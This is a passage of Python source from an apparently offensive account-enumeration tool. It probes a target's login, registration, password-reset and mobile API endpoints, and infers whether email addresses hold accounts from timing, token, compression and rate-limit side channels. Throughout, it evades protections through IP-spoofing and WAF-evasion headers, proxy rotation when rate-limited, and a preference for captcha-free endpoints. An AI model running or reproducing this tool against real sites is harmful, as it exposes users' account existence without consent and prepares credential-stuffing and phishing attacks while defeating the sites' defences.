    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose

    def analyze(self, endpoint: EndpointInfo, baseline_email: str,
                target_email: str, send_fn) -> Optional[dict]:
        resp1, t1 = send_fn(endpoint, baseline_email)
        if resp1 is None:
            return None
        resp2, t2 = send_fn(endpoint, target_email)
        if resp2 is None:
            return None

        token1 = self._extract_token(resp1)
        token2 = self._extract_token(resp2)

        if token1 is None and token2 is None:
            return None

        result = {"timing_diff": abs(t2 - t1)}
        if token1 and token2:
            result["token_length_diff"] = len(token2) - len(token1)
            result["entropy_diff"] = abs(
                self._token_entropy(token2) - self._token_entropy(token1)
            )
        elif token2 and not token1:
            result["token_present_for_target_only"] = True
            result["exists_signal"] = True
        elif token1 and not token2:
            result["token_present_for_baseline_only"] = True

        return result

    @staticmethod
    def _extract_token(resp) -> Optional[str]:
        body = resp.text or ""
        patterns = [
            r'token["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            r'reset[_-]?token["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            r'code["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            r'key["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
        ]
        for pat in patterns:
            m = re.search(pat, body, re.I)
            if m:
                return m.group(1)
        return None

    @staticmethod
    def _token_entropy(token: str) -> float:
        if not token:
            return 0.0
        freq: dict[str, int] = {}
        for c in token:
            freq[c] = freq.get(c, 0) + 1
        length = len(token)
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy


class CompressionOracle:
    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose

    def check(self, endpoint: EndpointInfo, baseline_email: str,
              target_email: str, send_fn) -> Optional[dict]:
        orig_headers = {}
        resp1, _ = send_fn(endpoint, baseline_email)
        if resp1 is None:
            return None
        ce1 = resp1.headers.get("Content-Encoding", "")
        cl1 = resp1.headers.get("Content-Length", "")

        resp2, _ = send_fn(endpoint, target_email)
        if resp2 is None:
            return None
        ce2 = resp2.headers.get("Content-Encoding", "")
        cl2 = resp2.headers.get("Content-Length", "")

        if not (ce1 or ce2):
            return None

        result = {
            "compressed": True,
            "encoding": ce1 or ce2,
        }
        if cl1 and cl2:
            try:
                len1, len2 = int(cl1), int(cl2)
                result["length_diff"] = len2 - len1
                result["significant"] = abs(len2 - len1) > 10
            except ValueError:
                pass
        raw_diff = len(resp2.content) - len(resp1.content)
        result["raw_byte_diff"] = raw_diff
        if abs(raw_diff) > 10:
            result["significant"] = True
        return result


class RetryAfterAnalyzer:
    def __init__(self, request_fn, verbose: bool = False):
        self._request = request_fn
        self.verbose = verbose

    def compare(self, endpoint: EndpointInfo, baseline_email: str,
                target_email: str, send_fn) -> Optional[dict]:
        resp1, t1 = send_fn(endpoint, baseline_email)
        if resp1 is None:
            return None
        resp2, t2 = send_fn(endpoint, target_email)
        if resp2 is None:
            return None

        ra1 = resp1.headers.get("Retry-After", "")
        ra2 = resp2.headers.get("Retry-After", "")
        xl1 = resp1.headers.get("X-RateLimit-Remaining", "")
        xl2 = resp2.headers.get("X-RateLimit-Remaining", "")
        xr1 = resp1.headers.get("X-RateLimit-Reset", "")
        xr2 = resp2.headers.get("X-RateLimit-Reset", "")

        diffs = {}
        if ra1 != ra2:
            diffs["retry_after"] = {"baseline": ra1, "target": ra2}
        if xl1 != xl2:
            diffs["ratelimit_remaining"] = {"baseline": xl1, "target": xl2}
        if xr1 != xr2:
            diffs["ratelimit_reset"] = {"baseline": xr1, "target": xr2}

        return diffs if diffs else None


class APIVersionBrute:
    def __init__(self, request_fn, target: str, verbose: bool = False):
        self._request = request_fn
        self.target = target.rstrip("/")
        self.verbose = verbose

    def brute(self) -> list[EndpointInfo]:
        found = []
        auth_suffixes = [
            "/auth/login", "/auth/register", "/auth/forgot-password",
            "/auth/check-email", "/users/check", "/email/check",
            "/login", "/register", "/signup", "/forgot-password",
            "/users", "/account", "/check-email",
        ]
        for version in range(1, 11):
            for suffix in auth_suffixes:
                url = f"{self.target}/api/v{version}{suffix}"
                r = self._request("HEAD", url, retries=0, timeout=3)
                if r is None:
                    continue
                if r.status_code in (404, 410, 502, 503, 504):
                    continue
                vec = Vector.LOGIN
                if "register" in suffix or "signup" in suffix:
                    vec = Vector.REGISTER
                elif "forgot" in suffix or "reset" in suffix:
                    vec = Vector.PASSWORD_RESET
                elif "check" in suffix or "users" in suffix:
                    vec = Vector.DIRECT_CHECK
                found.append(EndpointInfo(
                    url=url, method="POST", vector=vec,
                    status_code=r.status_code,
                ))
                if self.verbose:
                    print(f"    [APIVER] v{version}{suffix} -> {r.status_code}")
        return found


# ================================================================
#  MAIN ENGINE
# ================================================================

class AccountEnumerator:
    def __init__(self, target: str, proxy_file: Optional[str] = None,
                 threads: int = 5, timeout: int = 15, delay: float = 0.5,
                 verbose: bool = False, deep: bool = False, spoof_ip: bool = True,
                 mobile: bool = False, full: bool = False,
                 plugin_dir: Optional[str] = None,
                 checkpoint_file: Optional[str] = None,
                 no_verify: bool = False):
        self.target = target.rstrip("/")
        self.proxy_rotator = ProxyRotator(proxy_file, test_url=f"{target}/" if proxy_file else "", parallel=True)
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.deep = deep
        self.full = full
        self.mobile = mobile
        self.session = self._build_session()
        self.ip_spoofer = IPSpoofer(enabled=spoof_ip)
        self.rate_handler = RateLimitHandler(base_delay=delay)
        self.waf_detector = WAFDetector()
        self.lockout_detector = LockoutDetector()
        self.password_policy = PasswordPolicyEnum()
        self.plugin_mgr = PluginManager(plugin_dir)
        self.checkpoint = Checkpoint(checkpoint_file)
        self.session_analyzer = SessionAnalyzer()
        self.discovered_endpoints: list[EndpointInfo] = []
        self.baselines: dict[str, Baseline] = {}
        self.results: list[EnumResult] = []
        self.waf_detected: str = ""
        self.tech_stack: dict[str, str] = {}
        self.api_versions: list[str] = []
        self.interesting_headers: dict[str, list] = defaultdict(list)
        self.subdomains: list[str] = []
        self.catchall_detected: bool = False
        self.side_effects: dict[str, dict] = {}
        self.oauth_info: dict[str, Any] = {}
        self.multistep_chains: list[dict] = []
        self.idor_results: list[dict] = []
        self.no_verify = no_verify
        self.osint_recon: Optional[OSINTRecon] = None
        self.osint_results: dict[str, Any] = {}
        self.endpoint_scores: dict[str, float] = {}
        self.captchaless_only: bool = True

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5,
                      status_forcelist=[500, 502, 503, 504],
                      allowed_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        return s

    def _headers(self, waf_evasion: bool = True) -> dict:
        ua = random.choice(MOBILE_USER_AGENTS if self.mobile else USER_AGENTS)
        h = {
            "User-Agent": ua,
            "Accept": "application/json, text/html, */*; q=0.01",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.9,es;q=0.8",
                "en;q=0.9", "en-US,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": self.target,
            "Referer": f"{self.target}/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        }
        h.update(self.ip_spoofer.headers())
        if waf_evasion and self.waf_detected:
            h.update(self.waf_detector.evasion_headers(self.waf_detected))
        return h

    def _request(self, method: str, url: str, retries: int = 2, **kwargs) -> Optional[requests.Response]:
        kwargs.setdefault("headers", self._headers())
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("allow_redirects", False)
        proxy = self.proxy_rotator.random()
        if proxy:
            kwargs["proxies"] = proxy
        if self.waf_detected:
            time.sleep(random.uniform(0.05, 0.3))
        for attempt in range(retries + 1):
            try:
                resp = self.session.request(method, url, **kwargs)
                self._extract_interesting_headers(url, resp)
                if self.rate_handler.check(resp, url):
                    if self.verbose:
                        print(f"  {Fore.YELLOW}[RATE] {url} -- waiting {self.rate_handler.current_delay:.1f}s{Style.RESET_ALL}")
                    self.rate_handler.wait(url)
                    proxy = self.proxy_rotator.next()
                    if proxy:
                        kwargs["proxies"] = proxy
                    kwargs["headers"] = self._headers()
                    time.sleep(random.uniform(0.5, 2.0))
                    continue
                return resp
            except requests.exceptions.ProxyError:
                if proxy:
                    self.proxy_rotator.mark_dead(proxy)
                proxy = self.proxy_rotator.next()
                if proxy:
                    kwargs["proxies"] = proxy
                else:
                    kwargs.pop("proxies", None)
            except requests.exceptions.ConnectionError:
                if attempt < retries:
                    time.sleep(1 * (attempt + 1))
                    kwargs["headers"] = self._headers()
            except requests.exceptions.Timeout:
                if attempt < retries:
                    kwargs["timeout"] = self.timeout * 1.5
            except Exception as e:
                if self.verbose:
                    print(f"  {Fore.RED}[ERR] {method} {url}: {e}{Style.RESET_ALL}")
                break
        return None

    def _extract_interesting_headers(self, url: str, resp: requests.Response):
        interesting = [
            "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
            "x-request-id", "x-correlation-id", "x-trace-id",
            "x-powered-by", "server", "x-runtime", "x-debug",
            "x-frame-options", "content-security-policy",
            "x-content-type-options", "strict-transport-security",
        ]
        for key in interesting:
            val = resp.headers.get(key)
            if val:
                self.interesting_headers[key].append(val)
        powered = resp.headers.get("X-Powered-By", "")
        if powered:
            self.tech_stack["framework"] = powered
        server = resp.headers.get("Server", "")
        if server:
            self.tech_stack["server"] = server

    # == Phase 0: Recon ==

    def recon(self):
        print(f"\n{Fore.CYAN}[*] Phase 0: Target Recon{Style.RESET_ALL}")
        resp = self._request("GET", self.target)
        if resp is None:
            print(f"  {Fore.RED}[!] Target unreachable{Style.RESET_ALL}")
            return
        self.waf_detected = self.waf_detector.detect(resp)
        if self.waf_detected:
            print(f"  {Fore.YELLOW}[WAF] Detected: {self.waf_detected}{Style.RESET_ALL}")
        if self.tech_stack:
            for k, v in self.tech_stack.items():
                print(f"  {Fore.WHITE}[TECH] {k}: {v}{Style.RESET_ALL}")

        robots = self._request("GET", f"{self.target}/robots.txt")
        if robots and robots.status_code == 200:
            paths = re.findall(r'(?:Disallow|Allow):\s*(/\S+)', robots.text)
            auth_paths = [p for p in paths if any(kw in p.lower() for kw in
                          ("admin", "login", "user", "account", "api", "auth", "dashboard", "panel"))]
            if auth_paths:
                print(f"  {Fore.GREEN}[ROBOTS] Found {len(auth_paths)} interesting paths{Style.RESET_ALL}")
                for p in auth_paths[:10]:
                    print(f"    {p}")

        for api_path in ["/api", "/api/v1", "/api/v2", "/api/v3"]:
            r = self._request("GET", f"{self.target}{api_path}")
            if r and r.status_code not in (404, 403):
                self.api_versions.append(api_path)
        if self.api_versions:
            print(f"  {Fore.GREEN}[API] Versions found: {', '.join(self.api_versions)}{Style.RESET_ALL}")

        well_known = self._request("GET", f"{self.target}/.well-known/openid-configuration")
        if well_known and well_known.status_code == 200:
            try:
                oidc = well_known.json()
                print(f"  {Fore.GREEN}[OIDC] OpenID config found -- issuer: {oidc.get('issuer', 'unknown')}{Style.RESET_ALL}")
                self.oauth_info = oidc
                for key in ("authorization_endpoint", "token_endpoint", "userinfo_endpoint", "registration_endpoint"):
                    if key in oidc:
                        ep_url = oidc[key]
                        if not ep_url.startswith("http"):
                            ep_url = urllib.parse.urljoin(self.target, ep_url)
                        self.discovered_endpoints.append(EndpointInfo(
                            url=ep_url, method="POST", vector=Vector.OAUTH,
                        ))
            except Exception:
                pass

        sitemap = self._request("GET", f"{self.target}/sitemap.xml")
        if sitemap and sitemap.status_code == 200 and "xml" in sitemap.headers.get("Content-Type", "").lower():
            locs = re.findall(r'<loc>([^<]+)</loc>', sitemap.text)
            auth_locs = [l for l in locs if any(kw in l.lower() for kw in
                         ("login", "signin", "signup", "register", "auth", "account", "forgot",
                          "reset", "password", "api", "user", "profile", "sso", "oauth"))]
            if auth_locs:
                print(f"  {Fore.GREEN}[SITEMAP] Found {len(auth_locs)} auth-related URLs{Style.RESET_ALL}")
                for l in auth_locs[:15]:
                    print(f"    {l}")

        swagger_paths = [
            "/swagger.json", "/api/swagger.json",
            "/v1/swagger.json", "/v2/swagger.json",
            "/openapi.json", "/api/openapi.json",
            "/api-docs", "/api-docs/swagger.json",
            "/swagger/v1/swagger.json",
            "/api/v1/openapi.json", "/api/v2/openapi.json",
            "/docs/openapi.json", "/_api/docs",
            "/swagger-ui.html", "/swagger-ui/",
            "/redoc", "/api/docs",
        ]
        for sp in swagger_paths:
            sr = self._request("GET", f"{self.target}{sp}")
            if sr and sr.status_code == 200:
                ct = sr.headers.get("Content-Type", "").lower()
                if "json" in ct:
                    try:
                        spec = sr.json()
                        api_paths = spec.get("paths", {})
                        auth_ep_count = 0
                        for p, methods in api_paths.items():
                            lower_p = p.lower()
                            if any(kw in lower_p for kw in (
                                "login", "signin", "signup", "register", "auth",
                                "forgot", "reset", "password", "user", "account",
                                "email", "verify", "check", "otp", "2fa", "mfa",
                                "token", "session", "sso", "oauth",
                            )):
                                full = urllib.parse.urljoin(self.target, p)
                                vec = Vector.UNKNOWN
                                for v, kws in {
                                    Vector.LOGIN: ["login", "signin", "auth/sign", "session", "token", "authenticate"],
                                    Vector.REGISTER: ["register", "signup", "sign-up", "create"],
                                    Vector.PASSWORD_RESET: ["forgot", "reset", "recover", "password"],
                                    Vector.DIRECT_CHECK: ["check", "exists", "validate", "verify", "availability", "lookup"],
                                    Vector.OTP: ["otp", "2fa", "mfa", "code"],
                                }.items():
                                    if any(k in lower_p for k in kws):
                                        vec = v
                                        break
                                m = "POST"
                                if "post" in methods:
                                    m = "POST"
                                elif "get" in methods:
                                    m = "GET"
                                elif "put" in methods:
                                    m = "PUT"
                                self.discovered_endpoints.append(EndpointInfo(url=full, method=m, vector=vec))
                                auth_ep_count += 1
                        if auth_ep_count:
                            print(f"  {Fore.GREEN}[SWAGGER] {sp} -> {auth_ep_count} auth endpoints from API spec{Style.RESET_ALL}")
                        break
                    except Exception:
                        pass
                elif "html" in ct:
                    print(f"  {Fore.GREEN}[SWAGGER] API docs page found at {sp}{Style.RESET_ALL}")

        self._detect_spa_framework(resp)
        self._discover_security_txt()

    # == Phase 0b: Subdomain Discovery ==

    def osint_phase(self):
        print(f"\n{Fore.CYAN}[*] Phase 0a: OSINT Recon (16 free sources){Style.RESET_ALL}")
        self.osint_recon = OSINTRecon(self.target, self._request, verbose=self.verbose)
        self.osint_results = self.osint_recon.run_all()
        osint_subs = self.osint_recon.get_auth_subdomains()
        if osint_subs:
            print(f"  {Fore.GREEN}[OSINT] {len(osint_subs)} auth-related subdomains found{Style.RESET_ALL}")
            for sub in osint_subs[:20]:
                print(f"    {sub}")
        hist_eps = self.osint_recon.get_historical_endpoints()
        if hist_eps:
            print(f"  {Fore.GREEN}[OSINT] {len(hist_eps)} historical auth endpoints harvested{Style.RESET_ALL}")
        osint_emails = self.osint_results.get("emails", [])
        if osint_emails:
            print(f"  {Fore.GREEN}[OSINT] {len(osint_emails)} emails discovered from OSINT{Style.RESET_ALL}")
            for em in osint_emails[:10]:
                print(f"    {em}")

    def discover_subdomains(self):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 0b: Subdomain Discovery{Style.RESET_ALL}")
        sd = SubdomainDiscovery(self.target, self._request)
        base_subs = sd.discover()
        osint_subs = []
        if self.osint_recon:
            osint_subs = self.osint_recon.get_auth_subdomains()
        all_subs = list(dict.fromkeys(base_subs + osint_subs))
        self.subdomains = all_subs
        if self.subdomains:
            print(f"  {Fore.GREEN}[+] Found {len(self.subdomains)} subdomains (DNS brute + OSINT):{Style.RESET_ALL}")
            for sub in self.subdomains:
                print(f"    {sub}")

    def _discover_mobile_apis(self):
        print(f"\n  {Fore.CYAN}[MOBILE] Probing mobile-specific API patterns (often captcha-free){Style.RESET_ALL}")
        mobile_paths = [
            ("/api/mobile/login", Vector.LOGIN),
            ("/api/mobile/auth/login", Vector.LOGIN),
            ("/api/mobile/v1/login", Vector.LOGIN),
            ("/api/mobile/v1/auth/login", Vector.LOGIN),
            ("/api/mobile/signin", Vector.LOGIN),
            ("/api/mobile/register", Vector.REGISTER),
            ("/api/mobile/signup", Vector.REGISTER),
            ("/api/mobile/forgot-password", Vector.PASSWORD_RESET),
            ("/api/mobile/v1/forgot-password", Vector.PASSWORD_RESET),
            ("/api/mobile/v1/reset-password", Vector.PASSWORD_RESET),
            ("/api/mobile/check-email", Vector.DIRECT_CHECK),
            ("/api/mobile/v1/check-email", Vector.DIRECT_CHECK),
            ("/api/mobile/v1/users/check", Vector.DIRECT_CHECK),
            ("/api/app/login", Vector.LOGIN),
            ("/api/app/auth/login", Vector.LOGIN),
            ("/api/app/v1/login", Vector.LOGIN),
            ("/api/app/register", Vector.REGISTER),
            ("/api/app/forgot-password", Vector.PASSWORD_RESET),
            ("/api/app/check-email", Vector.DIRECT_CHECK),
            ("/mobile/api/login", Vector.LOGIN),
            ("/mobile/api/auth", Vector.LOGIN),
            ("/mobile/api/register", Vector.REGISTER),
            ("/mobile/api/forgot-password", Vector.PASSWORD_RESET),
            ("/m/api/login", Vector.LOGIN),
            ("/m/api/register", Vector.REGISTER),
            ("/m/api/forgot-password", Vector.PASSWORD_RESET),
            ("/api/ios/login", Vector.LOGIN),
            ("/api/ios/register", Vector.REGISTER),
            ("/api/android/login", Vector.LOGIN),
            ("/api/android/register", Vector.REGISTER),
            ("/api/native/login", Vector.LOGIN),
            ("/api/native/auth", Vector.LOGIN),
            ("/api/native/register", Vector.REGISTER),
            ("/api/react-native/login", Vector.LOGIN),
            ("/api/internal/login", Vector.LOGIN),
            ("/api/internal/auth/login", Vector.LOGIN),
            ("/api/internal/register", Vector.REGISTER),
            ("/api/client/login", Vector.LOGIN),
            ("/api/client/auth", Vector.LOGIN),
            ("/api/client/register", Vector.REGISTER),
            ("/api/client/forgot-password", Vector.PASSWORD_RESET),
        ]
        targets = [self.target] + self.subdomains[:5]
        found_count = 0
        mobile_headers = self._headers()
        mobile_headers["User-Agent"] = random.choice(MOBILE_USER_AGENTS)
        mobile_headers["X-App-Version"] = f"{random.randint(1,9)}.{random.randint(0,99)}.{random.randint(0,9)}"
        mobile_headers["X-Platform"] = random.choice(["ios", "android"])
        mobile_headers["X-Device-Id"] = hashlib.md5(os.urandom(8)).hexdigest()[:16]

        def probe_mobile(base, path, vector):
            url = f"{base}{path}"
            for method, kw in [
                ("POST", {"json": {}, "headers": dict(mobile_headers)}),
                ("POST", {"json": {"email": "probe@test.invalid"}, "headers": dict(mobile_headers)}),
                ("GET", {"headers": dict(mobile_headers)}),
            ]:
                resp = self._request(method, url, **kw)
                if resp and resp.status_code not in (404, 410, 502, 503, 504):
                    body = resp.text.lower() if resp.text else ""
                    if self._is_soft_404(body, resp):
                        return None
                    ep = self._build_endpoint_info(url, method, vector, resp)
                    if ep:
                        ep.captcha_enforced = False
                        return ep
            return None

        with ThreadPoolExecutor(max_workers=min(self.threads, 10)) as pool:
            futures = {}
            for base in targets:
                for path, vector in mobile_paths:
                    futures[pool.submit(probe_mobile, base, path, vector)] = f"{base}{path}"
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.discovered_endpoints.append(result)
                    found_count += 1
                    print(f"    {Fore.GREEN}[MOBILE] {result.method} {result.url} [{result.vector.value}]{Style.RESET_ALL}")

        if found_count:
            print(f"  {Fore.GREEN}[MOBILE] {found_count} mobile API endpoints found (likely captcha-free){Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[MOBILE] No mobile-specific APIs found{Style.RESET_ALL}")

    def _score_endpoints(self):
        print(f"\n  {Fore.CYAN}[SCORE] Ranking endpoints by usefulness{Style.RESET_ALL}")
        for ep in self.discovered_endpoints:
            score = 50.0
            if ep.captcha_enforced:
                score -= 40.0
            else:
                score += 20.0
            if ep.vector == Vector.DIRECT_CHECK:
                score += 25.0
            elif ep.vector == Vector.PASSWORD_RESET:
                score += 15.0
            elif ep.vector == Vector.LOGIN:
                score += 10.0
            elif ep.vector == Vector.REGISTER:
                score += 8.0
            elif ep.vector == Vector.GRAPHQL:
                score += 12.0
            elif ep.vector == Vector.OTP:
                score += 5.0
            if "api" in ep.url.lower():
                score += 10.0
            if "mobile" in ep.url.lower() or "app" in ep.url.lower() or "native" in ep.url.lower():
                score += 15.0
            if ep.method == "POST":
                score += 5.0
            if ep.content_type == "application/json":
                score += 5.0
            if ep.waf:
                score -= 5.0
            if ep.requires_csrf:
                score -= 3.0
            self.endpoint_scores[f"{ep.method}:{ep.url}"] = score

        self.discovered_endpoints.sort(
            key=lambda ep: self.endpoint_scores.get(f"{ep.method}:{ep.url}", 0), reverse=True
        )

        captcha_free = [ep for ep in self.discovered_endpoints if not ep.captcha_enforced]
        captcha_yes = [ep for ep in self.discovered_endpoints if ep.captcha_enforced]

        print(f"  {Fore.GREEN}[SCORE] {len(captcha_free)} captcha-free endpoints (prioritized){Style.RESET_ALL}")
        if captcha_yes:
            print(f"  {Fore.YELLOW}[SCORE] {len(captcha_yes)} captcha-protected endpoints (deprioritized){Style.RESET_ALL}")

        for ep in self.discovered_endpoints[:10]:
            key = f"{ep.method}:{ep.url}"
            sc = self.endpoint_scores.get(key, 0)
            cap_tag = f" {Fore.RED}[CAPTCHA]{Style.RESET_ALL}" if ep.captcha_enforced else ""
            print(f"    [{sc:.0f}] {ep.method} {ep.url} [{ep.vector.value}]{cap_tag}")

        if self.captchaless_only and captcha_free:
            self.discovered_endpoints = captcha_free
            print(f"\n  {Fore.GREEN}[CAPTCHALESS] Using {len(captcha_free)} captcha-free endpoints only{Style.RESET_ALL}")
        elif not captcha_free:
            print(f"\n  {Fore.YELLOW}[CAPTCHALESS] No captcha-free endpoints found — using all endpoints{Style.RESET_ALL}")

    def _detect_spa_framework(self, resp):
        if resp is None:
            return
        body = resp.text if resp.text else ""
        frameworks = []
        if "__NEXT_DATA__" in body or "_next/" in body:
            frameworks.append("Next.js")
            next_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>({.*?})</script>', body)
            if next_data:
                try:
                    nd = json.loads(next_data.group(1))
                    build_id = nd.get("buildId", "")
                    if build_id:
                        print(f"  {Fore.GREEN}[SPA] Next.js buildId: {build_id}{Style.RESET_ALL}")
                    props = json.dumps(nd.get("props", {}))
                    api_hits = re.findall(r'(/api/[a-zA-Z0-9/_-]+)', props)
                    for hit in set(api_hits):
                        full = urllib.parse.urljoin(self.target, hit)
                        self.discovered_endpoints.append(EndpointInfo(url=full, vector=Vector.UNKNOWN))
                    if api_hits:
                        print(f"  {Fore.GREEN}[SPA] Next.js __NEXT_DATA__ -> {len(set(api_hits))} API routes{Style.RESET_ALL}")
                except Exception:
                    pass
        if "ng-app" in body or "ng-controller" in body or "angular" in body.lower():
            frameworks.append("Angular")
        if "__NUXT__" in body or "nuxt" in body.lower():
            frameworks.append("Nuxt.js")
        if "react" in body.lower() or "reactroot" in body.lower() or "_reactRoot" in body:
            frameworks.append("React")
        if "vue" in body.lower() or "__vue__" in body:
            frameworks.append("Vue.js")
        if "svelte" in body.lower() or "__svelte" in body:
            frameworks.append("Svelte")
        if frameworks:
            self.tech_stack["frontend"] = ", ".join(frameworks)
            print(f"  {Fore.GREEN}[SPA] Frontend framework: {', '.join(frameworks)}{Style.RESET_ALL}")

        chunks = re.findall(r'["\'](/(?:static|_next|assets|chunks?|build|bundles?)/[^"\']+\.js)["\']', body)
        if chunks:
            print(f"  {Fore.WHITE}[SPA] Found {len(chunks)} JS chunks to scan{Style.RESET_ALL}")

    def _discover_security_txt(self):
        for path in ["/.well-known/security.txt", "/security.txt"]:
            r = self._request("GET", f"{self.target}{path}")
            if r and r.status_code == 200 and "contact" in r.text.lower():
                print(f"  {Fore.GREEN}[SECURITY.TXT] Found at {path}{Style.RESET_ALL}")
                break

    # == Phase 1: Endpoint Discovery ==

    def discover_endpoints(self):
        print(f"\n{Fore.CYAN}[*] Phase 1: Endpoint Discovery{Style.RESET_ALL}")
        all_paths = []
        for vector, paths in AUTH_PATHS.items():
            for path in paths:
                all_paths.append((path, vector))

        targets = [self.target] + self.subdomains
        total_probes = len(all_paths) * len(targets)
        print(f"  Probing {len(all_paths)} paths across {len(targets)} target(s) = {total_probes} probes")
        found: list[EndpointInfo] = []
        completed = [0]
        lock = threading.Lock()

        def _probe_with_progress(url, vector):
            result = self._probe_endpoint_fast(url, vector)
            with lock:
                completed[0] += 1
                if completed[0] % 50 == 0 or completed[0] == total_probes:
                    pct = int(completed[0] / total_probes * 100)
                    print(f"  [{pct}%] {completed[0]}/{total_probes} probed — {len(found)} alive", end="\r", flush=True)
            return result

        discovery_workers = min(max(self.threads * 2, 30), 40)
        with ThreadPoolExecutor(max_workers=discovery_workers) as pool:
            futures = {}
            for base in targets:
                for path, vector in all_paths:
                    url = f"{base}{path}"
                    futures[pool.submit(_probe_with_progress, url, vector)] = (path, vector)
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
        print()

        if HAS_BS4:
            crawled = self._crawl_forms()
            found.extend(crawled)
        if self.deep or self.full:
            js_endpoints = self._extract_js_endpoints()
            found.extend(js_endpoints)

        if self.osint_recon:
            hist_eps = self.osint_recon.get_historical_endpoints()
            if hist_eps:
                print(f"  {Fore.GREEN}[OSINT] Feeding {len(hist_eps)} historical endpoints into discovery{Style.RESET_ALL}")
                with ThreadPoolExecutor(max_workers=discovery_workers) as pool:
                    osint_futures = {pool.submit(self._probe_endpoint_fast, hep.url, hep.vector): hep for hep in hist_eps}
                    for future in as_completed(osint_futures):
                        probed = future.result()
                        if probed:
                            found.append(probed)

        seen = set()
        for ep in found:
            key = f"{ep.method}:{ep.url}"
            if key not in seen:
                seen.add(key)
                self.discovered_endpoints.append(ep)

        if self.deep or self.full:
            self._discover_mobile_apis()

        if not self.discovered_endpoints:
            print(f"  {Fore.YELLOW}[!] No endpoints from standard discovery -- running deep probe{Style.RESET_ALL}")
            self._deep_probe_fallback()

        print(f"\n  {Fore.GREEN}[+] {len(self.discovered_endpoints)} endpoints discovered:{Style.RESET_ALL}")
        for ep in self.discovered_endpoints:
            flags = []
            if ep.captcha_enforced:
                flags.append(f"captcha:{ep.captcha_type}")
            if ep.waf:
                flags.append(f"waf:{ep.waf}")
            if ep.requires_csrf:
                flags.append("csrf")
            flag_str = f" ({', '.join(flags)})" if flags else ""
            print(f"    {ep.method} {ep.url} [{ep.vector.value}]{flag_str}")

        self._score_endpoints()

    def _probe_endpoint_fast(self, url: str, vector: Vector) -> Optional[EndpointInfo]:
        DEAD_CODES = {404, 410, 502, 503, 504}
        REDIRECT_CODES = {301, 302, 303, 307, 308}

        discovery_timeout = min(self.timeout, 5)

        head_resp = self._request("HEAD", url, retries=0, timeout=discovery_timeout)
        if head_resp is None:
            get_resp = self._request("GET", url, retries=0, timeout=discovery_timeout)
            if get_resp is None:
                return None
            if get_resp.status_code in DEAD_CODES:
                return None
            if self._is_soft_404(get_resp.text.lower() if get_resp.text else "", get_resp):
                return None
        elif head_resp.status_code in DEAD_CODES:
            return None

        fast_probes = [
            ("POST", {"json": {"email": "probe@test.invalid"}, "timeout": discovery_timeout}),
            ("POST", {"data": "email=probe%40test.invalid", "timeout": discovery_timeout}),
            ("GET", {"timeout": discovery_timeout}),
        ]

        for method, extra_kwargs in fast_probes:
            kw = dict(extra_kwargs)
            if method == "POST" and "data" in kw:
                kw.setdefault("headers", self._headers())
                kw["headers"]["Content-Type"] = "application/x-www-form-urlencoded"

            resp = self._request(method, url, retries=0, **kw)
            if resp is None:
                continue

            if resp.status_code in REDIRECT_CODES:
                loc = resp.headers.get("Location", "")
                if loc:
                    resolved = loc if loc.startswith("http") else urllib.parse.urljoin(url, loc)
                    rr = self._request("GET", resolved, retries=0, timeout=discovery_timeout)
                    if rr and rr.status_code not in DEAD_CODES:
                        ep = self._build_endpoint_info(resolved, method, vector, rr)
                        if ep:
                            return ep
                continue

            if resp.status_code in DEAD_CODES:
                continue

            if resp.status_code < 500:
                body = resp.text.lower() if resp.text else ""
                if self._is_soft_404(body, resp):
                    continue
                ep = self._build_endpoint_info(url, method, vector, resp)
                if ep:
                    return ep

        return None

    def _probe_endpoint(self, url: str, vector: Vector) -> Optional[EndpointInfo]:
        DEAD_CODES = {404, 410, 502, 503, 504}
        REDIRECT_CODES = {301, 302, 303, 307, 308}
        ALIVE_SIGNALS = {200, 201, 400, 401, 403, 405, 415, 422, 429}

        probe_payloads = [
            ("POST", {"json": {}}),
            ("POST", {"json": {"email": "probe@test.invalid"}}),
            ("POST", {"data": "email=probe%40test.invalid"}),
            ("GET", {}),
            ("OPTIONS", {}),
            ("HEAD", {}),
        ]

        for method, extra_kwargs in probe_payloads:
            kw = dict(extra_kwargs)
            if method == "POST" and "data" in kw:
                kw.setdefault("headers", self._headers())
                kw["headers"]["Content-Type"] = "application/x-www-form-urlencoded"

            resp = self._request(method, url, **kw)
            if resp is None:
                continue

            if resp.status_code in REDIRECT_CODES:
                loc = resp.headers.get("Location", "")
                if loc:
                    resolved = loc if loc.startswith("http") else urllib.parse.urljoin(url, loc)
                    rr = self._request("GET", resolved)
                    if rr and rr.status_code not in DEAD_CODES:
                        ep = self._build_endpoint_info(resolved, method, vector, rr)
                        if ep:
                            return ep
                continue

            if resp.status_code in DEAD_CODES:
                continue

            if resp.status_code in ALIVE_SIGNALS or resp.status_code < 500:
                body = resp.text.lower() if resp.text else ""
                if self._is_soft_404(body, resp):
                    continue
